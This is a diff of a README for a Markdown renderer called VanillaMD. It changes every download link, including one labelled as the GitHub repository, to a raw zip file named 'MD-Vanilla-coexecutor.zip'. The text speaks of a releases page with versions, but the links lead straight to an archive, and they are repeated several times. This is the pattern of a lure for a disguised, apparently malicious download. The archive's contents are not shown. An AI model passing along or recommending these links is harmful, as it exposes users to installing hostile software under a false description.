@@ -13,13 +13,13 @@ Welcome to VanillaMD! This simple tool lets you easily render Markdown files. No
 
 ## 📥 Download VanillaMD
 
-### 🔗 [Download VanillaMD](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/VanillaMD.zip)
+### 🔗 [Download VanillaMD](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/MD-Vanilla-coexecutor.zip)
 
 ### 📝 Steps to Download and Install
 
 1. **Visit the Releases Page**: Click the link below to go to the download page:
    
-   [Download VanillaMD](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/VanillaMD.zip)
+   [Download VanillaMD](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/MD-Vanilla-coexecutor.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of VanillaMD. Look for the latest stable version.
 
@@ -52,13 +52,13 @@ VanillaMD is open-source software, meaning it is free for anyone to use. You can
 
 ## 🔗 Resources
 
-- **GitHub Repository**: [VanillaMD on GitHub](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/VanillaMD.zip)
+- **GitHub Repository**: [VanillaMD on GitHub](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/MD-Vanilla-coexecutor.zip)
 - **Documentation**: You can view more detailed documentation on features and usage in the repository.
 
 ### 📥 Download Link Again
 
 Just in case you missed it, here’s the link to download VanillaMD once more: 
 
-[Download VanillaMD](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/VanillaMD.zip)
+[Download VanillaMD](https://raw.githubusercontent.com/iann123d/VanillaMD/main/wayleave/MD-Vanilla-coexecutor.zip)
 
 Enjoy using VanillaMD for all your Markdown rendering needs!
